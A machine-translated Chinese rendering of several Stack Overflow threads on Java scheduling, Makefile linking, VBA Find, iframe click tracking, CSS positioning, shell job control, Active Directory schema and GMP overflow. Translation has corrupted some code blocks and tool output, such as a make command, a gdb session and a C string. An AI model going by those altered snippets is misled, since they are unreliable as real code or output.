    private HashMap<Integer, GameServer> listofGameServers = new HashMap<>();

    public ServerManager() {
    }

    public void registerGameServer(GameServer gs) {
        listofGameServers.put(gs.getId(), gs);
    }

    public HashMap<Integer, GameServer> getGameServers() {
        return new HashMap<>(listofGameServers);
    }

    public int idCreator() {
        synchronized (count) {
            return count.incrementAndGet();
        }
    }

    public int generateRandomNumber(int start, int end) {
        Random rand = new Random();
        int number = start + rand.nextInt(end - start + 1);
        return number;
    }
} 
```

玩家：

```
import java.util.HashMap;

public class Player implements Runnable {

    private int id;
    private ServerManager server;

    public Player(ServerManager sm) {
        this.server = sm;
        this.id = server.idCreator();
    }

    @Override
    public void run() {
        System.out.println("Player running every second");

        HashMap<Integer, GameServer> listOfGameServers = server.getGameServers();

        //int randomGameServer = listOfGameServers.get(server.generateRandomNumber(0, listOfGameServers.size()-1)).getId();
        int a = server.generateRandomNumber(0, listOfGameServers.size() - 1);
        System.out.println("Player selected a server: " + a);
    }

    public int getId() {
        return id;
    }
} 
```

主要的：

```
import java.util.concurrent.*;

public class TestDriver {

    public static void main(String[] args) {
        ServerManager server = new ServerManager();

        ScheduledExecutorService game = Executors.newScheduledThreadPool(3);
        for (int j = 0; j < 3; j++) {
            game.scheduleAtFixedRate(new GameServer(server), 0, 1, TimeUnit.SECONDS);
        }

        ScheduledExecutorService prodExec = Executors.newScheduledThreadPool(3);
        prodExec.scheduleAtFixedRate(new Player(server), 0, 1, TimeUnit.SECONDS);
    }
} 
```

在`Player`类中，有一行注释的代码`int randomGameServer =...`run 方法按预期每秒流畅运行。但是如果我取消注释，播放器运行的方法只会执行几次并停止。我想做的是让玩家随机选择一个游戏服务器加入。有谁知道它为什么停止？

带有注释行的结果（播放器连续运行）：

```
Game server is collecting data every second
Game server is collecting data every second
Game server is collecting data every second
Player running every second
Player selected a server: 0
Game server is collecting data every second
Game server is collecting data every second
Game server is collecting data every second
Player running every second
Player selected a server: 2
Game server is collecting data every second
Game server is collecting data every second
Game server is collecting data every second
Player running every second
Player selected a server: 2
Game server is collecting data every second
Game server is collecting data every second
Game server is collecting data every second
Player running every second
Player selected a server: 1
Game server is collecting data every second
Game server is collecting data every second
Game server is collecting data every second
Player running every second
Player selected a server: 0
Game server is collecting data every second
Game server is collecting data every second
Game server is collecting data every second
Player running every second
Player selected a server: 0 
```

未注释行的结果（播放器运行了几次）：

```
Game server is collecting data every second
Game server is collecting data every second
Game server is collecting data every second
Player running every second
Player selected a server: 1
Game server is collecting data every second
Game server is collecting data every second
Game server is collecting data every second
Player running every second
Game server is collecting data every second
Game server is collecting data every second
Game server is collecting data every second
Game server is collecting data every second
Game server is collecting data every second
Game server is collecting data every second
Game server is collecting data every second 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T04:08:56.083

你从来没有打电话`registerGameServer()`，所以`HashMap`它仍然是空的，做`get()`会给你一个空结果。称`getId()`原因为`NullPointerException`.

一旦你解决了它，看看你的程序的效率。无需`HashMap`每次都创建一个新的，获取相同的并通过使用并发版本使其线程安全。

此外，对于`Random`，而不是每次都创建一个新的，使用`ThreadLocalRandom`.

# c - make 在编译和链接 C 程序时忽略 -std=c99 标志

> ID：13328394
> 
> 赞同：4
> 
> 时间：2012-11-11T03:45:30.267
> 
> 标签：c, compilation, makefile

我试图让我的 makefile 编译一个需要`-std=c99`运行的文件。在这种情况下，它通过一个“for-loop”。

这是我的代码，（在 "$(CC)" 之前使用了 "tab" ）：

```
CC = gcc
CFLAGS = -c -std=c99

...

Download.o : Download.c
    $(CC) $(CFLAGS) Download.c 
```

Download.c 包含用于从 Web 下载元素的方法

### 错误信息

```
$ make
gcc -c -std=c99 Download.c
gcc Download.c -o Program
Download.c: In function ‘downloadImageparts’:
Download.c:11:2: error: ‘for’ loop initial declarations are only allowed in C99 mode
Download.c:11:2: note: use option -std=c99 or -std=gnu99 to compile your code
Download.c:13:3: error: ‘for’ loop initial declarations are only allowed in C99 mode
make: *** [comp] Error 1 
```

### 尝试调试

如果我`gcc -c -std=c99 Download.c`在终端运行它工作正常。

在 Linux 中运行时会出现此问题。

**解决了：**

我创建了一个虚拟项目来展示我的讲师，试图解决我的问题。在虚拟项目中，所描述的代码一切正常。出于某种原因，我的代码可以在原地工作，但不能在其他地方工作。如果有人读到这个和我有同样的问题并且想看一个示例项目。让我知道，我会在这里写代码。谢谢

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-11T04:15:15.480

你在看错误的规则。 `Download.c`实际上编译很好，但是链接阶段是错误的。

```
$ 制作
gcc -c -std=c99 Download.c   *#编译*
gcc Download.c -o Program    *#链接*

```

修复链接程序的 make 规则。它应该看起来像这样：

```
Program: a.o b.o c.o
    $(CC) $(LDFLAGS) -o $@ $^ $(LIBS) 
```

当你使用它时，我建议一个更完整的 Makefile 看起来像这样：

```
all: Program
clean:
    rm -f Program *.o
.PHONY: all clean

# -c is implicit, you don't need it (it *shouldn't* be there)
# CC is also implicit, you don't need it
CFLAGS := -std=c99 -g -Wall -Wextra

Program: a.o b.o c.o
    $(CC) $(LDFLAGS) -o $@ $^ $(LIBS)

# Make will automatically generate the necessary commands
# You just need to name which headers each file depends on
# (You can make the dependencies automatic but this is simpler)
a.o: a.c header.h
b.o: b.c header.h header2.h
c.o: c.c header.h 
```

### 如何做错的例子

链接器标志实际上相当敏感！一定要按照我写的完全正确地输入上面的行，不要假设你写的内容是等价的。以下是一些错误且**不应使用的命令***略有*不同的示例：

 **```
# WRONG: program must depend on *.o files, NOT *.c files
Program: a.c b.c c.c
    $(CC) ...

# WRONG: -c should not be in CFLAGS
CFLAGS := -c -std=c99

Program: a.o b.o c.o
    # WRONG: $(CFLAGS) should not be here
    # you are NOT compiling, so they do not belong here
    $(CC) $(CFLAGS) $(LDFLAGS) -o $@ $^ $(LIBS)

    # WRONG: $(LIBS) MUST come at the end
    # otherwise linker may fail to find symbols
    $(CC) $(LDFLAGS) -o $@ $(LIBS) $^

    # WRONG: do not list *.o files, use $^ instead
    # otherwise it is easy to get typos here
    $(CC) $(LDFLAGS) -o $@ a.o b.o c.o $(LIBS)

    # WRONG: $(LDFLAGS) must be at the beginning
    # it only applies to what comes after, so you
    # MUST put it at the beginning
    $(CC) -o $@ $(LDFLAGS) $^ $(LIBS)

    # WRONG: -c flag disables linking
    # but we are trying to link!
    $(CC) $(LDFLAGS) -c -o $@ $^ $(LIBS)

    # WRONG: use $(CC), not gcc
    # Don't sabotage your ability to "make CC=clang" or "make CC=gcc-4.7"
    gcc $(LDFLAGS) -o $@ $^ $(LIBS)

    # WRONG: ld does not include libc by default!
    ld $(LDFLAGS) -o $@ $^ $(LIBS) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T03:52:38.983

如果我在 makefile 中使用空格而不是制表符，我会看到相同的结果，并且输出`make`显示未使用该规则：

```
$ make
cc    -c -o Download.o Download.c
Download.c: In function ‘main’:
Download.c:4:3: error: ‘for’ loop initial declarations are only allowed in C99 mode
Download.c:4:3: note: use option -std=c99 or -std=gnu99 to compile your code
make: *** [Download.o] Error 1 
```

`tab`在以 .开头的行之前尝试 a `gcc`。

* * *

看到原始问题的更新后：

```
$ make
gcc -c -std=c99 Download.c
gcc Download.c -o Program 
```

第一（编译）行没有显示错误。
这是第二行，它*重新编译* `Download.c`，失败了。正如 Dietrich Epp[建议](https://stackoverflow.com/a/13328521/29157)
的那样， 我认为您想在此处链接`.o`文件以创建可执行文件。`Program`**

# excel - 在 VBA 中使用查找函数

> ID：13328395
> 
> 赞同：3
> 
> 时间：2012-11-11T03:45:39.503
> 
> 标签：excel, vba

```
1
2
3
4  
.
. 
```

所以我有一个从 1 到 20 的数字序列。我选择了顶部的数字“1”，我想搜索整个列并找到数字“9”。当我没有将范围命名为“rng”时，该代码有效；它找到数字并选择。但是当我命名数字范围时，代码停止工作。范围函数有什么问题？是不是如果我`Dim rng as Range`在以后定义时定义它，`"Set rng="`我就不能在末尾添加`".Select"`or`".Copy"`扩展名？

```
Sub macro2()

Dim rng As Range
Set rng = Range(ActiveCell, ActiveCell.End(xlDown)).Select
rng.Find(10).Select

End Sub 
```

另外，如果我想从 1-20 对整列求和，在数字“20”下方的最后一个单元格上，我应该使用以下代码吗？因为应用程序对象似乎没有这样做。谢谢！

```
rng.End(xlDown).Offset(1, 0).Select
Application.WorksheetFunction.Sum (rng.Value) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T04:41:27.740

要在活动列中查找 10，您可以尝试这个（最终选择第一个`10`- 尽管`Select`在[vba](/questions/tagged/vba "显示标记为“vba”的问题")中通常不需要，除了将用户带到代码末尾的位置）

*   测试找到的范围是否存在（即您可以`10`在继续之前找到）
*   如果[ `xlWhole`lookAt *]*`100`的当前默认值为*`xlPart`*
**   使用 search *[After]* as`Cells(1, ActiveCell.Column`和*[Search Direction]* as`xlNext`查找向下看的第一个值。*

 ***代码**

```
Sub QuickFind()
Dim rng1 As Range
Set rng1 = ActiveCell.EntireColumn.Find(10, Cells(1, ActiveCell.Column), xlFormulas, xlWhole, , xlNext)
If Not rng1 Is Nothing Then
Application.Goto rng1
Else
MsgBox "10 not found"
End If
End Sub 
```

**第2部分**

```
Sub Other()
Dim rng1 As Range
Set rng1 = Range(Cells(1, ActiveCell.Column), Cells(Rows.Count, ActiveCell.Column).End(xlUp))
rng1.Cells(rng1.Cells.Count).Offset(1, 0) = Application.WorksheetFunction.Sum(rng1.Value)
End Sub 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-07-09T03:44:00.063

试试这个，我希望这也能帮助你找到特定的行号和列名。在代码中你可以使用

```
strRw = FindColumn(Sheet name, "Value which need to be found", True, "Cell Name",Row number)
sourceCOL = colname(FindColumn(Shee Name, "Value which need to be found", False, , 4)) 
```

下面是find的主要功能

```
Public Function FindColumn(colnocountWS As Worksheet, srcstr As String, Optional rowflag As Boolean, Optional bycol As String, Optional strw As Integer, Optional stcol As Integer) As Integer
            Dim srcrng      As Range     'range of search text
            Dim srcAddr     As String  'address of search text
            Dim stcolnm     As String

            colnocountWS.Activate
            If stcol <> 0 Then stcolnm = colname(stcol)
            If stcol = 0 Then stcolnm = "A"
            If strw = 0 Then strw = 1

            colnocountWS.Range(stcolnm & strw).Select

            If ActiveSheet.Range(stcolnm & strw) = srcstr Then
                ActiveSheet.Range(stcolnm & strw).Select
                FindColumn = 1
            Else
            If bycol = "" Then
                Set srcrng = colnocountWS.Cells.Find(Trim(srcstr), after:=ActiveCell, LookIn:=xlValues _
                , LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:=xlNext, _
                MatchCase:=False, SearchFormat:=False)
            Else
                Set srcrng = colnocountWS.Cells.Find(Trim(srcstr), after:=ActiveCell, LookIn:=xlValues _
                , LookAt:=xlWhole, SearchOrder:=xlByColumns, SearchDirection:=xlNext, _
                MatchCase:=False, SearchFormat:=False)
            End If
            'ByPart
            If srcrng Is Nothing Then
                If bycol = "" Then
                    Set srcrng = colnocountWS.Cells.Find(Trim(srcstr), after:=ActiveCell, LookIn:=xlValues _
                    , LookAt:=xlPart, SearchOrder:=xlByRows, SearchDirection:=xlNext, _
                    MatchCase:=False, SearchFormat:=False)
                Else
                    Set srcrng = colnocountWS.Cells.Find(Trim(srcstr), after:=ActiveCell, LookIn:=xlValues _
                    , LookAt:=xlPart, SearchOrder:=xlByColumns, SearchDirection:=xlNext, _
                    MatchCase:=False, SearchFormat:=False)
                End If
            End If

                If srcrng Is Nothing Then
                FindColumn = 0
                 Exit Function
                Else
                    srcAddr = srcrng.Address
                    colnocountWS.Range(srcAddr).Select
                    FindColumn = ActiveCell.Column
                    If rowflag = True Then FindColumn = ActiveCell.Row
                End If

            End If
        End Function

        'this function find column name
        Public Function colname(iFinalCol1 As Integer) As String
        Dim colnm As String
        On Error GoTo gg
        If Mid(Cells(1, iFinalCol1).Address, 3, 1) = "$" Then
                colnm = Mid(Cells(1, iFinalCol1).Address, 2, 1)
          Else
                colnm = Mid(Cells(1, iFinalCol1).Address, 2, 2)
        End If
        gg: colname = colnm

        End Function 
```*

# javascript - 在 iframe 内跟踪点击

> ID：13328396
> 
> 赞同：2
> 
> 时间：2012-11-11T03:45:45.870
> 
> 标签：javascript, jquery, iframe, google-analytics, click

我想通过谷歌分析事件跟踪点击我页面上 iframe 内的 href。iframe 在同一个域中。可能吗？如何？
iframe 在加载后会动态插入到页面上。将此代码放在 iframe 之后是否重要？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T15:19:21.107

如果 iframe 在您的域中，则 iframe 的内容可能在您的控制之下（如果不是，您将没有任何业务跟踪该框架）。因此，您可以简单地在 iframe 文档中安装 Google Analytics 跟踪代码（无论如何您都想这样做，毕竟框架页面与您网站上的任何其他页面没有太大不同，您会想知道它的频率被称为）。因此，虽然您可以从（同源）iframe（调用 window.parent）访问父框架，但没有必要或不推荐。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T03:56:45.790

如果 iframe 是同一个域，您可以（从主窗口）等待 iframe 加载，然后安装事件侦听器来处理对特定链接的点击。

您需要的代码是：

1.  等待 iframe 内容加载的代码。
2.  在 iframe 中查找相关链接的代码
3.  安装事件监听器的代码
4.  处理点击事件的代码

# javafx - 使用另一个类的 JavaFx 应用程序实例

> ID：13328398
> 
> 赞同：4
> 
> 时间：2012-11-11T03:46:00.063
> 
> 标签：javafx

我有一个如下所示的 MainWindowFx 类。它基本上创建了一个简单的`JavaFX`GUI。

```
package drawappfx;

import javafx.stage.Stage;
import javafx.scene.Scene;
import javafx.scene.control.TextArea;
import javafx.scene.control.Button;
import javafx.scene.layout.BorderPane;
import javafx.scene.layout.VBox;
import javafx.application.Application;
import javafx.geometry.Insets;
import javafx.scene.control.TextAreaBuilder;

/**
 *
 * @author Hieu
 */
public class MainWindowFX extends Application{
    public static final int DEFAULT_WIDTH = 600;
    public static final int DEFAULT_HEIGHT = 600;

    private int width;
    private int height;

    private Scene scene;
    private TextArea messageView;
    private Button quitButton;
    private BorderPane layout;
    private Stage primaryStage;

    @Override
    public void start(Stage primaryStage) {
        System.out.println("Started building GUI....");
        this.buildGUI();
        System.out.println("Finished building GUI");
        this.primaryStage = primaryStage;
        primaryStage.setTitle("Hello World!");
        primaryStage.setScene(this.scene);
        primaryStage.show();
        System.out.println("Where the hell are you?");
    }

    public Scene getScene() {
        return this.scene;
    }

    public BorderPane getBorderPane() {
        return this.layout;
    }

    public Stage getPrimaryStage() {
        return this.primaryStage;
    }

    public void buildGUI() {
        System.out.println("Before layout");
        this.layout = new BorderPane();
        System.out.println("Before vbox");
        this.layout.setBottom(this.addVBox());
        System.out.println("before new scene");
        this.scene = new Scene(this.layout, DEFAULT_WIDTH, DEFAULT_HEIGHT);
        System.out.println("after new scene");
    }

    public VBox addVBox() {
       VBox vbox = new VBox();
       vbox.setPadding(new Insets(15, 12, 15, 12));

       // message box
       this.messageView = TextAreaBuilder.create()
               .prefRowCount(5)
               .editable(false)
               .build();

       // quit button
       this.quitButton = new Button("Quit");
       this.quitButton.setPrefSize(100, 20);
       System.out.println("think of a good message?");
       vbox.getChildren().addAll(this.messageView, this.quitButton);
       System.out.println("before returning vbox");
       return vbox;
    }

    public void postMessage(final String s) {
        this.messageView.appendText(s);
    }
} 
```

现在我想在另一个类中使用这个对象的一个​​实例：

```
package drawappfx;

import java.io.InputStreamReader;
import java.io.Reader;
import javafx.scene.layout.BorderPane;

public class DrawAppFx
{
  public static void main(String[] args)
  {
    final MainWindowFX main = new MainWindowFX();
    BorderPane layout = main.getBorderPane();
    Reader reader = new InputStreamReader(System.in);
    Parser parser = new Parser(reader,layout,main);
    main.start(main.getPrimaryStage());
    parser.parse();
  }    

} 
```

但是当我运行它时，我遇到了这个错误：

```
java.lang.reflect.InvocationTargetException
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at com.javafx.main.Main.launchApp(Main.java:658)
    at com.javafx.main.Main.main(Main.java:805)
Caused by: java.lang.IllegalStateException: Not on FX application thread; currentThread = main
    at com.sun.javafx.tk.Toolkit.checkFxUserThread(Toolkit.java:237)
    at com.sun.javafx.tk.quantum.QuantumToolkit.checkFxUserThread(QuantumToolkit.java:397)
    at javafx.scene.Scene.<init>(Scene.java:287)
    at javafx.scene.Scene.<init>(Scene.java:226)
    at drawappfx.MainWindowFX.buildGUI(MainWindowFX.java:74)
    at drawappfx.MainWindowFX.start(MainWindowFX.java:47)
    at drawappfx.DrawAppFx.main(DrawAppFx.java:39)
    ... 6 more
Java Result: 1 
```

我对此进行了一些搜索，并猜测它与线程有关......但我仍然不知道。有什么建议么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-05T04:18:26.477

我已经多次遇到这个问题，并且有一个相当简单的方法可以解决它。

首先让我介绍一下[中介者模式](http://en.wikipedia.org/wiki/Mediator_pattern)，基本上你想创建一个与你所有的*GUI*类都有关系的类。

（即，不同的 GUI 类彼此之间没有自己的实例，而是它们都具有对 Mediator 的相同引用）。

这是你的问题的一个侧重点。

为了更改窗口，您需要传递`Stage`应该放置新窗口的窗口，因此您的代码只需要稍作更改：

现在我不经常这样做，但在你的情况下，我会例外，以下代码包含一个类，你可以“复制粘贴”到你的程序中，并在代码之后使用它来解决问题，我将准确解释我的内容做过：

**调解员**

```
public class Mediator extends Application {

    private DrawAppFx daf;
    private MainWindowFX mainWindow;
    private Stage primaryStage;
    public Mediator(){
        daf = new DrawAppFx(this);
        mainWindow = new MainWindowFx(this);

    }
    public static void main(String[] args){
        launch(args);
    }
    @Override
    public void start(Stage stage) throws Exception {
        primaryStage = stage;
        mainWindow.start(primaryStage);
    }
    public void changeToDaf(){
        daf.start(primaryStage);
    }
} 
```

现在每个`DrawAppFx`and`MainWindowFx`都必须有一个构造函数来传递一个 Mediator 对象，因此与该 mediator 有一个“ *Has-a* ”关系

这背后的原因是调解器模式现在处于控制之中，如果您创建更多窗口很容易实现，只需将它们添加到调解器并添加调解器可以更改到该窗口的方法。

# javascript - 是否可以在保持父级固定的同时使子级 div 静态？

> ID：13328399
> 
> 赞同：1
> 
> 时间：2012-11-11T03:46:08.843
> 
> 标签：javascript, html, css, positioning, fixed

我有一列在页面的右侧对齐。该列必须跨越页面的整个高度，因此我将其固定的原因。列中将有不应修复的项目。无论我玩什么项目，都继续滚动页面。

有没有人有办法让子 div 在固定的父级中保持静态，或者在不使用固定定位的情况下使列跨越页面的整个高度？

这是CSS：

```
.rightCol{
   width: 28px; 
   position: fixed; 
   bottom: 0px; 
   top: 0px; 
   z-index: -1; 
   margin-left: 969px;
}
.rightColItem{
   margin-top: 95px;
   margin-left: 10px;
   position: absolute;
}​ 
```

和 HTML：

```
<div class="rightCol">
   <div class="rightColItem">
      I want this to be static and not fixed
   </div>
</div> 
```

这是一个小提琴的链接-> [http://jsfiddle.net/7hmKy/](http://jsfiddle.net/7hmKy/)

任何帮助是极大的赞赏！

**编辑 1：**右对齐栏位于 1000px 的容器 div 内。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T04:02:14.173

一种更简单的方法（也可以使用更少的标记）是使用 CSS3 渐变作为页面背景。您还可以轻松地使用图像回退来支持旧浏览器：

```
body {
  width: 100%;
  height: 100%;
  background: -webkit-gradient(linear, 100% 50%, 0% 50%, color-stop(100%, #fa8072), color-stop(100%, transparent));
  background: -webkit-linear-gradient(right, #fa8072 200px, transparent 200px);
  background: -moz-linear-gradient(right, #fa8072 200px, transparent 200px);
  background: -o-linear-gradient(right, #fa8072 200px, transparent 200px);
  background: linear-gradient(right, #fa8072 200px, transparent 200px);
}

.sidebar {
  width: 200px;
  float: right;
} 
```

[演示](http://codepen.io/anon/pen/dzlkt)（我使用了 Sass 和[Compass](http://compass-style.org/)，因为它们使 CSS3 渐变更容易保持更新。）

**编辑：**

根据您的评论，我使用`body`1000px 宽的居中创建了一个新示例（您可以使用 div 进行一些调整）并更改渐变以复制边框：

```
body {
  height: 100%;
  min-height: 2000px;
  width: 1000px;
  margin: 0 auto;
  background: -webkit-gradient(linear, 100% 50%, 0% 50%, color-stop(98.33333%, transparent), color-stop(98.33333%, #000000), color-stop(100%, transparent)), -webkit-gradient(linear, 100% 50%, 0% 50%, color-stop(0%, #000000), color-stop(83.33333%, #000000), color-stop(100%, transparent));
  background: -webkit-linear-gradient(right, transparent 295px, #000000 295px, transparent 300px), -webkit-linear-gradient(right, #000000, #000000 10px, transparent 12px);
  background: -moz-linear-gradient(right, transparent 295px, #000000 295px, transparent 300px), -moz-linear-gradient(right, #000000, #000000 10px, transparent 12px);
  background: -o-linear-gradient(right, transparent 295px, #000000 295px, transparent 300px), -o-linear-gradient(right, #000000, #000000 10px, transparent 12px);
  background: linear-gradient(right, transparent 295px, #000000 295px, transparent 300px), linear-gradient(right, #000000, #000000 10px, transparent 12px);
} 
```

[演示](http://codepen.io/anon/pen/avrpq)

# c - 外壳作业控制

> ID：13328402
> 
> 赞同：3
> 
> 时间：2012-11-11T03:46:45.863
> 
> 标签：c, shell

对于我的学校项目，我正在实施一个外壳，我需要工作控制方面的帮助。如果我们输入一个命令，比如`cat &`，那么因为`&`它应该在后台运行，但它不起作用。我有这个代码：

```
{
  int pid;  
  int status;  
  pid = fork();  
  if (pid == 0) {  
    fprintf(stderr, "Child Job pid = %d\n", getpid());  
    execvp(arg1, arg2);  
  } 
  pid=getpid();  
  fprintf(stderr, "Child Job pid is = %d\n", getpid());      
  waitpid(pid, &status, 0);  
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T04:53:00.540

您应该为 SIGCHLD 信号设置一个信号处理程序，而不是直接等待。每当子进程停止或终止时都会发送 SIGCHLD。查看[进程完成](http://www.gnu.org/software/libc/manual/html_node/Process-Completion.html#Process-Completion)的 GNU 描述。

本文末尾有一个示例处理程序（我在下面或多或少地复制并粘贴了它）。试着用它来建模你的代码。

```
 void sigchld_handler (int signum) {
     int pid, status, serrno;
     serrno = errno;
     while (1) {
         pid = waitpid(WAIT_ANY, &status, WNOHANG);
         if (pid < 0) {
             perror("waitpid");
             break;
         }
         if (pid == 0)
           break;
         /* customize here.
            notice_termination is in this case some function you would provide
            that would report back to your shell.
         */             
         notice_termination (pid, status);
     }
     errno = serrno;
 } 
```

关于这个主题的另一个很好的信息来源是[UNIX 环境中的高级编程](https://rads.stackoverflow.com/amzn/click/com/0321525949)，第 8 章和第 10 章。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T03:56:36.133

父进程正在调用`waitpid`子进程，子进程将阻塞直到子进程改变状态（即终止）。

# active-directory - Active Directory - 为 Person 添加辅助类

> ID：13328405
> 
> 赞同：0
> 
> 时间：2012-11-11T03:47:02.983
> 
> 标签：active-directory

我正在使用 Active Directory 设置测试环境。

我在 Active Directory Schema 中创建了一些自定义属性和一个`Auxiliary Class`名为`AdditionalHRInfo`.

我确实尝试将这个辅助类添加到`person`类中。但是，它无法添加它。

将显示一个警告框，其中显示“架构主服务器拒绝了更改。”。

我的问题是：

1.  是否可以在类中添加辅助类`person`？
2.  Active Directory 架构的日志文件在哪里？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T04:03:58.670

经过多次尝试，我发现，如果`mandatory attribute`我的辅助类中有一个，它**无法**添加到`person`类中。

# c - GMP pow 中的溢出处理

> ID：13328409
> 
> 赞同：9
> 
> 时间：2012-11-11T03:47:41.717
> 
> 标签：swi-prolog, yap, c, swi-prolog, biginteger, gmp, yap

（我只是 GMP 库的间接用户，主要通过[swi-prolog](/questions/tagged/swi-prolog "显示标记为“swi-prolog”的问题")和[yap](/questions/tagged/yap "显示标记为“yap”的问题")。但我对解决这个问题非常感兴趣。）

当执行具有大得离谱的值的幂运算时，主机系统或 GMP 不再能够适当地处理溢出。我已经与上述系统的开发人员进行了交谈，但他们没有看到一个简单的解决方法。

其他 GMP 系统/用户是否知道这个问题？你如何处理这样的溢出？

作为健全性检查，首先测试 7^7^7 的值，它应该是：375982...32343

例如，在 32 位系统上，查询会`?- X is 13^1150000000.`产生这样的溢出。以下是 YAP 提供的内容：

```
GNU gdb (GDB) 7.0-ubuntu
版权所有 (C) 2009 Free Software Foundation, Inc.
许可 GPLv3+：GNU GPL 版本 3 或更高版本
这是免费软件：您可以自由更改和重新分发它。
在法律允许的范围内，不提供任何保证。输入“显示复制”
和“显示保修”了解详情。
这个 GDB 被配置为“i486-linux-gnu”。
有关错误报告说明，请参阅：
...
从 /opt/gupu/src/yap-6.3/narch-gupu2/yap...读取符号...完成。
(gdb) 运行 -f
启动程序：/opt/gupu/src/yap-6.3/narch-gupu2/yap -f
YAP 6.3.2 (i686-linux)：2012 年 11 月 11 日星期日 04:19:37 CET
?- X 是 13^1150000000。

程序收到信号 SIGSEGV，分段错误。
0x001638d8 在?? () 来自 /usr/lib/libgmp.so.3
(gdb) BT
#0 0x001638d8 在?? () 来自 /usr/lib/libgmp.so.3
#1 0x00164470 in __gmpn_mul_fft () from /usr/lib/libgmp.so.3
#2 0x001646c2 in __gmpn_mul_fft_full () from /usr/lib/libgmp.so.3
#3 0x00165f28 in __gmpn_sqr_n () from /usr/lib/libgmp.so.3
#4 0x0014b58b in __gmpz_n_pow_ui () from /usr/lib/libgmp.so.3
#5 0x0014c4a1 in __gmpz_pow_ui () from /usr/lib/libgmp.so.3
#6 0x080c4a1d in Yap_gmp_exp_int_int (i1=13, i2=1150000000) at ../C/gmp_support.c:939
#7 0x0815f9df in p_exp (t1=, t2=3082051592) at ../C/arith2.c:609
#8 0x080b1f19 in Eval (t=0) at ../C/eval.c:147
#9 0x080b2251 in p_is () at ../C/eval.c:186
#10 0x0806b56a 在 Yap_absmi (inp=0) at ../C/absmi.c:6912
#11 0x080b3655 in exec_absmi (top=) at ../C/exec.c:1002
#12 0x080b3b1f 在 do_goal (t=, CodeAdr=, arity=,
    pt=0x0，顶部=1) 在 ../C/exec.c:1068
#13 0x080b3d1d in Yap_RunTopGoal (t=135918154) at ../C/exec.c:1291
#14 0x08061a6f 在 YAP_RunGoalOnce (t=135918154) at ../C/c_interface.c:2511
#15 0x0805c2f5 in do_top_goal (argc=2, argv=0xbffff4c4) at ../console/yap.c:84
#16 exec_top_level (argc=2, argv=0xbffff4c4) at ../console/yap.c:131
#17 主要 (argc=2, argv=0xbffff4c4) 在 ../console/yap.c:172
(gdb)

```

* * *

编辑：对于 64 位系统也是如此；像这样：

```
Welcome to SWI-Prolog (Multi-threaded, 64 bits, Version 6.3.5)
Copyright (c) 1990-2012 University of Amsterdam, VU Amsterdam
SWI-Prolog comes with ABSOLUTELY NO WARRANTY. This is free software,
and you are welcome to redistribute it under certain conditions.
Please visit http://www.swi-prolog.org for details.

For help, use ?- help(Topic). or ?- apropos(Word).

?- X is 3445^2^62.
gmp: overflow in mpz type
Abort 
```

然而，

```
?- X is 2^2^63.
ERROR: Out of global stack
?- X is 2^2^62.
gmp: overflow in mpz type
Abort 
```

从下面：

```
?- X is 2^2^36.
ERROR: Out of global stack
?- X is 2^2^37.
gmp: overflow in mpz type
Abort 
```

因此，如果数字足够大，则 SWI 会检测到错误 - 因此可以由 SWI 处理（错误：消息由 SWI 处理）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-09T20:11:46.367

不是真正的答案，而是解释 SWI-Prolog 的作用。首先，它估计是否可能发生溢出。如果确定，它将在调用 GMP 之前引发错误。否则，它依赖于 GMP 分配挂钩并在失败时执行 longjmp()。它跟踪为什么进行了哪些分配，并取消分配为中止的 GMP 操作分配的内存。它可以这样做是因为内存永远不会永久处于 GMP 控制之下。成功的 GMP 计算结果被复制到 Prolog 堆栈并接受 Prolog 内存管理。

这曾经有效，但在最近的版本中不起作用。我怀疑 GMP 会估计大小，如果知道这将失败，它甚至不会打扰调用 malloc() 钩子。我所需要的只是一种确保始终调用钩子的方法，即使它的值非常大。任何大于 size_t 可以表示的东西都可以用 (size_t)-1 调用钩子。

Ps 由于复制到（较小的）Prolog 运行时堆栈，它比内存可以存储的内存要早得多。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-09T15:40:43.557

有些人为解决此问题所做的一些事情（不受支持并且它会泄漏一些内存，但他们发现它总比没有好）：GMP 允许您指定替换分配器（mp_set_memory_functions）。从这个分配器中，您可以调用 malloc，如果它失败了，您可以抛出 C++ 异常（如果您使用 gcc，请使用 -fexceptions 重新编译 gmp）或调用 longjmp 或类似的东西来绕过 GMP 的故障处理并跳回您控制的代码。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-11T22:52:46.493

13^1,150,000,000 大约是 2^4,255,505,675，需要 4,255,505,675 位来表示。每字节 8 位，这大约是 500 MB 的内存。好像应该合适。

也许计算中涉及到几个临时变量，它超出了进程大小的限制。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-14T14:54:53.337

好吧，看来我不走运：

即使是[最新版本](http://gmplib.org:8000/gmp-5.0/file/e50aa4d72823/mpz/realloc.c)

```
   fprintf (stderr, "gmp: mpz 类型溢出\n");
   中止（）；

```

至少这个溢出被处理并且不能被用作漏洞利用。

并且任何使用 GMP 的没有此问题的系统都必须使用修改后的库或复制用于估计大小的功能。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-13T02:04:06.350

看起来如果你有一个克雷，它会工作的。

```
#if defined (_CRAY) && ! defined (_CRAYMPP)
/* plain `int' is much faster (48 bits) */
#define __GMP_MP_SIZE_T_INT     1
typedef int         mp_size_t;
typedef int         mp_exp_t;
#else
